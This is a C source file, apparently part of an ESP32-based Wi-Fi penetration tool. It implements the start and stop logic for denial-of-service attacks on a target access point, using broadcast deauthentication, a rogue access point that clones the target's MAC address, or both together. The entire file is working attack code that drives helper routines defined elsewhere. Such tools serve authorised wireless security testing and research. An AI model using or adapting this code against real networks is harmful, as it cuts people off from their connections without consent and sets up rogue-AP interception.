/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;
static bool active;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    method = attack_config->method;
    active = true;
    esp_err_t err = ESP_OK;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
            err = attack_method_broadcast(attack_config->ap_record, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            err = attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            err = attack_method_rogueap(attack_config->ap_record);
            if (err == ESP_OK) err = attack_method_broadcast(attack_config->ap_record, 1);
            break;
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
    }
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Start failed: %s", esp_err_to_name(err));
        attack_dos_stop();
        attack_update_status(TIMEOUT);
    }
}

void attack_dos_stop() {
    if (!active) return;
    active = false;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    method = -1;
    ESP_LOGI(TAG, "DoS attack stopped");
}
